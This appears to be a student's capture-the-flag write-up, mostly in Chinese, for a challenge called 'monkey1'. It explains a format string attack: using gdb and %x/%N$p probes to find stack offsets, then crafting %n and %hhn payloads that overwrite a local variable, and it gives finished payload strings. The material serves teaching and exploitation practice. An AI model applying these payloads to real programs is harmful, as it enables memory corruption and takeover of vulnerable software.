# monkey1

## core concept

format string attack

## step

- 用 gdb 建 checkpoint in program `b program`
- 因漏洞的 stack 從 local esp 往上算, 且實際位置會動, 所以要算出 banana local var 的 pointer 的偏移量
- 根據 https://www.cnblogs.com/clover-toeic/p/3755401.html stack 架構圖, 在 program 子程序中光 tmp[1024] 就佔 256 個 %x(1byte), 手算大概 26x 出頭的位置可以得到 banana 的 pointer, 可以先利用 gdb 直接印查出該測試用執行檔的 address, 再從 26x 開始試 `%N$p` 試到顯示該 address, 其為不會變的 stack 當下偏移量, 可以用此偏移量取得該次執行的該區域變數地址在此題為 269, gdb 在不同執行檔下地址會變, 所以要用偏移量看
- 得知要更改的目標, 要有要變成的目標值, 利用 format string attack %n 語法即可改值
  edit target(example): 0xffffd084,
  target value: 0x3132000a

```
by little end:
4 + 4 + 2 = 10 寫入 p32(0xffffd084) => a
(10) + 12584 寫入 p32(0xffffd084+2) => 3132
concept:
實際寫入內容 => p32(banana)+p32(banana+2)+b"%2c%7$n%12584c%8$n" 共 8 byte
- 第 7 byte 為 p32(banana)
- 第 8 byte 為 p32(banana+2)
final 格式: b(變更目標地址存放的位置與 stack 之偏移量)+b(%目標值c%實際存儲區目標地址偏移量$n)
note: 所有值都要經過微調, 串聯後也要微調, [變更目標地址存放的位置與 stack 之偏移量] 可以用下方補充方法取得
```

補充方法

- 在 program input `AABB.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x`
- 可以看到 output `AABB.400.f7f0f5c0.f7f0ee34.0.9.0.42424141.2e78252e.252e7825.78252e78`
- 其中 4242 為 `BB` 在偏移 7
- 其中 4141 為 `AA` 在偏移 8
- 可以得知放入 target address 後, 取得其的偏移量

最終 output

`program(p32(banana)+p32(banana+2)+b"%2c%7$n%12584c%8$n")`

## note

Summary

1. 利用 %N$x dump 出 stack 中的 memory，找到要 overwrite
   的 target
2. 如果 target 在 stack 上，可以直接用 %N$n 改；如果不在，
   必須讓 target 的 address 想辦法出現在 stack 上
3. 用 %Nc 控制印出的字元數，再用 %N$hhn overwrite target

最後 payload 可能會長得像這樣：
`\xdc\xed\xbf\xbf\xdd\xed\xbf\xbf\xde\xed\xbf\xbf\xdf\xed\xbf\xbf%100
c%30$hhn%220c%31$hhn%55c%32$hhn%66c%33$hhn`
